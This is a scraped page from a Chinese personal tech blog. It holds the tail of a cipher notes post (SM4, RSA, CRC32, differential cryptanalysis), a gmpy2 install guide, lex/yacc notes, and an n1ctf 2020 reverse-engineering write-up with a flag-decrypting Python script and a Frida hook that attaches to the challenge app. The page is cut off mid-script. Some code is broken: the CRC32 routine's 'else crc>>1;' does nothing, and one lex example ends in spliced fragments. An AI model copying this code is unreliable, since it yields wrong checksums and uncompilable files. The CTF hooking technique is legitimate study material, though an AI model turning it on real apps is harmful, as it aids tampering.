class="line">        mk[i] = R(mk[i]);</span><br><span class="line">        p[i] = R(p[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    initKey(mk);</span><br><span class="line">    printArray(<span class="string">&quot;plain text&quot;</span>, p, <span class="number">4</span>);</span><br><span class="line">    encrypt(p);</span><br><span class="line">    printArray(<span class="string">&quot;cipher&quot;</span>, p, <span class="number">4</span>);</span><br><span class="line">    decrypt(p);</span><br><span class="line">    printArray(<span class="string">&quot;plain text(after decrypt)&quot;</span>, p, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        p[i] = R(p[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(data, p, <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p>[1] SM4算法标准</p>
<h2 id="公钥加密算法"><a href="#公钥加密算法" class="headerlink" title="公钥加密算法"></a>公钥加密算法</h2><h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><blockquote>
<p>费马小定理</p>
<p>$p$是质数，$a$不是$p$的倍数，$a^{p-1}mod\ p\equiv1$</p>
</blockquote>
<p>那么对于数据$a$，加密后的数据为$c$，私钥为$e,p,q$，公钥为$d,n$</p>
<p>其中$n=pq$，$ed\equiv 1(\mod (p-1)(q-1))$</p>
<p>则加密</p>
<script type="math/tex; mode=display">
c=a^{e}\mod n</script><p>解密</p>
<script type="math/tex; mode=display">
c^{d}\mod n\equiv (a^e)^d\mod n\equiv a^{ed}\mod n</script><p>由于</p>
<script type="math/tex; mode=display">
a^{ed}\equiv a^{1+t(p-1)(q-1)}\mod n=aa^{(p-1)(q-1)}\mod n</script><p>又由于$n=pq,ab\mod n=(a\mod n)(b\mod n)\mod n$</p>
<p>得到</p>
<script type="math/tex; mode=display">
a^{(p-1)(q-1)}\mod n</script><p>从而</p>
<script type="math/tex; mode=display">
(a^{p-1})^{q-1}\mod pq\equiv a^{p-1}\mod p\equiv 1</script><p>从而解密出来为$a$</p>
<h3 id="ElGamal"><a href="#ElGamal" class="headerlink" title="ElGamal"></a>ElGamal</h3><p>// TODO</p>
<h2 id="其它加密算法"><a href="#其它加密算法" class="headerlink" title="其它加密算法"></a>其它加密算法</h2><h3 id="CRC32"><a href="#CRC32" class="headerlink" title="CRC32"></a>CRC32</h3><p>用于校验数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">CRC</span><span class="params">(<span class="keyword">uint32_t</span> *v,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> crc32tab[<span class="number">256</span>],crc,dwcrc=<span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">        crc=i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">0</span>;j&lt;<span class="number">8</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(crc&amp;<span class="number">1</span>)crc=(crc&gt;&gt;<span class="number">1</span>)^<span class="number">0xEDB88320</span>;</span><br><span class="line">            <span class="keyword">else</span> crc&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        crc32tab[i]=crc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        dwcrc=crc32tab[(dwcrc^v[i])&amp;<span class="number">0xFF</span>]^(dwcrc&gt;&gt;<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    dwcrc=~dwcrc;</span><br><span class="line">    <span class="keyword">return</span> dwcrc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>CRC并不安全，只用于传输过程中完整性的校验</p>
<h3 id="base系列"><a href="#base系列" class="headerlink" title="base系列"></a>base系列</h3><p>base64，base56，base32，base16</p>
<p>找到base表</p>
<h2 id="差分密码分析"><a href="#差分密码分析" class="headerlink" title="差分密码分析"></a>差分密码分析</h2><p>攻击者选取一部分明文并获取相应密文，运用若干对有着常量差异的明文，计算其中的差异$\Delta x=f(x_1,x_2)$，其中$f$可以自定义，比如异或操作。</p>
<p>然后攻击者计算相应密文的差异，尝试找出差异分布的统计特征。明文差异和密文差异所组成的差异叫做差分，统计特征由所使用的S盒所决定。</p>
<p>对于S盒$S$，攻击者分析差分$(\Delta x,\Delta y),\Delta y=S(x\oplus \Delta x)\oplus S(x)$。攻击者希望某个密文差异出现的频率非常高，这样就能将加密和随机过程区分开来。</p>
<blockquote>
<p>最基本的差分密码分析密钥破解形式中，攻击者首先获取大量明文对的密文，并假设差分在至少<em>r</em> − 1轮后有效，<em>r</em>即加密算法的总轮数。攻击者在倒数第二轮与最后一轮之间差异固定的假设下，去推测可能的轮密钥。如果轮密钥比较短，那么只需举可能的轮密钥，直到最后一轮运算结果和差异的<em>密文对</em>一致即可。当一个轮密钥看起来明显比其他密钥常出现时，其会被假设是正确的轮密钥</p>
</blockquote>
<p>还不是很懂，回头看吧英文版似乎有个简单的例子。</p>
<p>参考资料</p>
<p>[1] <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%B7%AE%E5%88%86%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90">差分密码分析—wikipedia</a></p>

      
    </div><!-- .entry-content -->

    <footer class="entry-meta">
    <a href="/2020/10/21/note/rev/usual_cipher/">
    <time datetime="2020-10-21T10:50:40.000Z" class="entry-date">
        2020-10-21
    </time>
</a>
    
    
    </footer>
</article>






  
    <article id="post-note/develop/python_gmpy" class="post-note/develop/python_gmpy post type-post status-publish format-standard hentry">
    <!---->

      <header class="entry-header">
        
        
  
    <h1 class="entry-title">
      <a class="article-title" href="/2020/10/21/note/develop/python_gmpy/">windows下python安装gmpy2</a>
    </h1>
  

        
        <div class="comments-link">
            
            <a href="javascript:void(0);" data-url="http://example.com/2020/10/21/note/develop/python_gmpy/" data-id="ckgj4wnxw0001xowbgw6z7fw0" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
        </div><!-- .comments-link -->
      </header><!-- .entry-header -->

    <div class="entry-content">
      
        <h2 id="gmp"><a href="#gmp" class="headerlink" title="gmp"></a>gmp</h2><p>gmp是gnu的大整数运算库，gmpy2应用于python平台</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol>
<li><p>安装python</p>
</li>
<li><p>安装wheel</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install wheel</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装gmpy对应的wheel</p>
<p>在<a target="_blank" rel="noopener" href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#gmpy">这个网站</a>找到你的python版本对应的gmpy2 wheel，比如说我是python3.8版本就选择<code>gmpy2-2.0.8-c</code><strong>p38</strong><code>-cp38-win_amd64.whl</code>下载之后安装。</p>
<p>python版本直接在命令行内运行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="literal">-version</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>安装gmpy2</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install gmpy2</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python</span><br></pre></td></tr></table></figure>
<p>输入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br></pre></td></tr></table></figure>
<p>不报错即可</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43302174/article/details/102933164">基于python3在windows下安装gmpy2</a></p>

      
    </div><!-- .entry-content -->

    <footer class="entry-meta">
    <a href="/2020/10/21/note/develop/python_gmpy/">
    <time datetime="2020-10-21T08:20:24.000Z" class="entry-date">
        2020-10-21
    </time>
</a>
    
    
    </footer>
</article>






  
    <article id="post-note/compiler/lex_and_yacc" class="post-note/compiler/lex_and_yacc post type-post status-publish format-standard hentry">
    <!---->

      <header class="entry-header">
        
        
  
    <h1 class="entry-title">
      <a class="article-title" href="/2020/10/21/note/compiler/lex_and_yacc/">lex，yacc学习笔记</a>
    </h1>
  

        
        <div class="comments-link">
            
            <a href="javascript:void(0);" data-url="http://example.com/2020/10/21/note/compiler/lex_and_yacc/" data-id="ckgj4wnxs0000xowb8toy5shn" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
        </div><!-- .comments-link -->
      </header><!-- .entry-header -->

    <div class="entry-content">
      
        <h2 id="lex和yacc是什么"><a href="#lex和yacc是什么" class="headerlink" title="lex和yacc是什么"></a>lex和yacc是什么</h2><p>lex是一个生成词法分析器的程序，flex是其开源版本。</p>
<p>所谓生成词法分析器，就是按照你的意愿，遇到某个词法时执行某个动作</p>
<p>yacc时生成编译器的编译器，生成的主要是编译器的词法解析器。配合yacc使用，当解析到某种语法时执行一定的动作。</p>
<p>lex的开源版本为flex，yacc对应gnu的bison</p>
<p>kali安装</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install flex bison</span><br></pre></td></tr></table></figure>
<h2 id="lex使用简单介绍"><a href="#lex使用简单介绍" class="headerlink" title="lex使用简单介绍"></a>lex使用简单介绍</h2><p>lex文件格式为*.l，例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">%&#125;</span><br><span class="line">%%</span><br><span class="line"><span class="function">stop <span class="title">printf</span><span class="params">(<span class="string">&quot;Stop command received\n&quot;</span>)</span></span>;</span><br><span class="line"><span class="function">start <span class="title">printf</span><span class="params">(<span class="string">&quot;Start command received\n&quot;</span>)</span></span>;</span><br><span class="line">%%</span><br></pre></td></tr></table></figure>
<p>保存，然后执行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lex 文件名.l</span><br></pre></td></tr></table></figure>
<p>会在同目录下生成lex.yy.c</p>
<p>执行命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cc lex.yy.c -ll -o a # -ll代表使用lex库，提供了main函数，-o a代表输出到</span><br></pre></td></tr></table></figure>
<p>运行a程序，发现输入stop和start时会打印对应的东西，其他情况回显</p>
<p>lex使用正则表达式</p>
<h2 id="yacc使用"><a href="#yacc使用" class="headerlink" title="yacc使用"></a>yacc使用</h2><p>yacc语法分析器解析一个标识流符，这里就需要lex配合了。因为yacc并不知道输入流中的字符是什么东西。</p>
<p>假定有一个温度计，使用如下语言控制它</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">heat on</span><br><span class="line">Heater on!</span><br><span class="line">heat off</span><br><span class="line">Header off!</span><br><span class="line">target temperature set!</span><br></pre></td></tr></table></figure>
<p>lex的tokenizer为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;y.tab.h&quot;</span></span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line">[<span class="number">0</span><span class="number">-9</span>]+ <span class="keyword">return</span> NUMBER;</span><br><span class="line">heat <span class="keyword">return</span> TOKHEAT;</span><br><span class="line">on|off <span class="keyword">return</span> STATE;</span><br><span class="line">target <span class="keyword">return</span> TOKTARGET;</span><br><span class="line">temperature <span class="keyword">return</span> TOKTEMPERATURE;</span><br><span class="line">\n <span class="comment">/* ignore end of line */</span>;</span><br><span class="line">[ \t]+ <span class="comment">/* ignore whitespace */</span></span><br><span class="line">%%ure <span class="built_in">set</span>\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">&#125;;</span></span><br></pre></td></tr></table></figure>
<p>y.tab.h中定义了NUMBER，TOKHEAT这些常量，这个文件由yacc根据我们编写的语法规则生成</p>
<p>yacc的文件后缀名为*.y</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在lex.yy.c里定义，会被yyparse()调用。在此声明消除编译和链接错误。</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">yylex</span><span class="params">(<span class="keyword">void</span>)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 在此声明，消除yacc生成代码时的告警</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">yyparse</span><span class="params">(<span class="keyword">void</span>)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yywrap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该函数在y.tab.c里会被调用，需要在此定义</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[error] %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	yyparse();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%token NUMBER TOKHEAT STATE TOKTARGET TOKTEMPERATURE</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line">commands: <span class="comment">/* empty */</span></span><br><span class="line">| commands command</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">command: heat_switch | target_set ;</span><br><span class="line"></span><br><span class="line">heat_switch:</span><br><span class="line">TOKHEAT STATE</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\tHeat turned on or off\n&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">target_set:</span><br><span class="line">TOKTARGET TOKTEMPERATURE NUMBER</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\tTemperature set\n&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line">%%</span><br></pre></td></tr></table></figure>
<p>编译运行这个程序</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lex a.l</span><br><span class="line">yacc -d a.y # 增加-d选项以生成y.tab.h</span><br><span class="line">cc lex.yy.c y.tab.c -o a</span><br></pre></td></tr></table></figure>
<p>现在为止，已经具备一个编译器的基本单元。但是考虑这个问题：lex识别了一个标识符，但是C语言中不同的标识符有不同的含义，所以还需要为它生成一个ID，为语义分析做准备。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;y.tab.h&quot;</span></span></span><br><span class="line">%&#125;</span><br><span class="line"><span class="comment">// yytext指识别到的语句，yyval用来向yacc传递值</span></span><br><span class="line">%%</span><br><span class="line">[<span class="number">0</span><span class="number">-9</span>]+ yylval = atoi(yytext); <span class="keyword">return</span> NUMBER;</span><br><span class="line">heat <span class="keyword">return</span> TOKHEAT;</span><br><span class="line">on|off yylval = !<span class="built_in">strcmp</span>(yytext, <span class="string">&quot;on&quot;</span>); <span class="keyword">return</span> STATE;</span><br><span class="line">target <span class="keyword">return</span> TOKTARGET;</span><br><span class="line">temperature <span class="keyword">return</span> TOKTEMPERATURE;</span><br><span class="line">\n <span class="comment">/* ignore end of line */</span></span><br><span class="line">[ \t]+ <span class="comment">/* ignore whitespace */</span></span><br><span class="line">%%</span><br></pre></td></tr></table></figure>
<p>yacc规则中也需要做出一些更改</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">target_set:</span><br><span class="line">TOKTARGET TOKTEMPERATURE NUMBER</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\tTemperature set to %d\n&quot;</span>, $<span class="number">3</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// $3表示这个语法的第三个单元中的参数</span></span><br><span class="line">heat_switch:</span><br><span class="line">TOKHEAT STATE</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($<span class="number">2</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\tHeat turned on\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\tHeat turned off\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $2表示这个语法中第二个单元的参数</span></span><br></pre></td></tr></table></figure>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/143867739">Lex与YACC详解 - Deepliu的文章 - 知乎</a></p>

      
    </div><!-- .entry-content -->

    <footer class="entry-meta">
    <a href="/2020/10/21/note/compiler/lex_and_yacc/">
    <time datetime="2020-10-21T07:55:31.000Z" class="entry-date">
        2020-10-21
    </time>
</a>
    
    
    </footer>
</article>






  
    <article id="post-writeup/n1ctf2020/wp" class="post-writeup/n1ctf2020/wp post type-post status-publish format-standard hentry">
    <!---->

      <header class="entry-header">
        
        
  
    <h1 class="entry-title">
      <a class="article-title" href="/2020/10/20/writeup/n1ctf2020/wp/">n1ctf 2020 逆向wp</a>
    </h1>
  

        
        <div class="comments-link">
            
            <a href="javascript:void(0);" data-url="http://example.com/2020/10/20/writeup/n1ctf2020/wp/" data-id="ckgj4wnxx0002xowbhq4f2n1r" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
        </div><!-- .comments-link -->
      </header><!-- .entry-header -->

    <div class="entry-content">
      
        <h2 id="oflo"><a href="#oflo" class="headerlink" title="oflo"></a>oflo</h2><p>// TODO</p>
<h2 id="easyapk"><a href="#easyapk" class="headerlink" title="easyapk"></a>easyapk</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random,string</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;n1ctf&#123;17b87f9aae8933ef&#x27;</span></span><br><span class="line">print(s+<span class="string">&#x27;a&#x27;</span>*(<span class="number">38</span>-len(s))+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">print(len(s)<span class="number">-6</span>)</span><br><span class="line">a = <span class="string">&#x27;jZe3yJG3zJLHywu4otmZzwy&#x27;</span></span><br><span class="line">tab = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+-&#x27;</span></span><br><span class="line">rtab = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tab)):</span><br><span class="line">    d[tab[i]] = rtab[i]</span><br><span class="line">ra = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    ra+=d[i]</span><br><span class="line">ra+=<span class="string">&#x27;=&#x27;</span></span><br><span class="line">flag1 = base64.b64decode(ra.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">print(<span class="string">&#x27;flag1:&#x27;</span>,flag1)</span><br><span class="line"></span><br><span class="line">iv = <span class="string">b&#x27;17b87f9aae8933ef&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\&#x27;17b87f9aae8933efn1ctf&#123;&#125;&#x27;</span></span><br><span class="line">cipher = bytes([<span class="number">0xA5</span>, <span class="number">0xA4</span>, <span class="number">0x4C</span>, <span class="number">0xD</span>, <span class="number">0xD2</span>, <span class="number">0x52</span>, <span class="number">0x1E</span>, <span class="number">0x63</span>, <span class="number">0x54</span>, <span class="number">0xC5</span>, <span class="number">0x29</span>, <span class="number">0xFA</span>,<span class="number">0xE4</span>, <span class="number">0xEC</span>, <span class="number">0x1F</span>, <span class="number">0x27</span>,<span class="number">0x52</span>, <span class="number">0xD2</span>, <span class="number">0xF1</span>, <span class="number">0xB7</span>, <span class="number">0xE4</span>, <span class="number">0x1C</span>, <span class="number">0x61</span>, <span class="number">0x42</span>, <span class="number">0x77</span>, <span class="number">0x9F</span>, <span class="number">0x5D</span>, <span class="number">0xA1</span>, <span class="number">0x87</span>, <span class="number">0xA</span>, <span class="number">0xEC</span>, <span class="number">0x55</span>])</span><br><span class="line">aes = AES.new(mode=AES.MODE_CBC,iv=iv,key=key)</span><br><span class="line"><span class="comment"># 03b5029f16f7e605</span></span><br><span class="line">print(aes.decrypt(cipher))</span><br><span class="line">print(<span class="string">&#x27;n1ctf&#123;&#x27;</span>+str(flag1,encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">&#x27;03b5029f16f7e605&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>hook脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida,sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message,data</span>):</span></span><br><span class="line">    print(message)</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>]==<span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        print(<span class="string">&#x27;[*] &#123;0&#125;&#x27;</span>.format(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    jscode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;1.jsx&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        jscode = f.read()</span><br><span class="line">    p = frida.get_usb_device().attach(<span class="string">&#x27;com.nu1l.ctf&#x27;</span>)</span><br><span class="line">    script = p.create_script(jscode)</span><br><span class="line">    script.on(<span class="string">&#x27;message&#x27;</span>,on_message)</span><br><span class="line">    script.load()</span><br><span class="line">    sys.stdin.read()</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_string</span>(<span class="params">offset</span>) 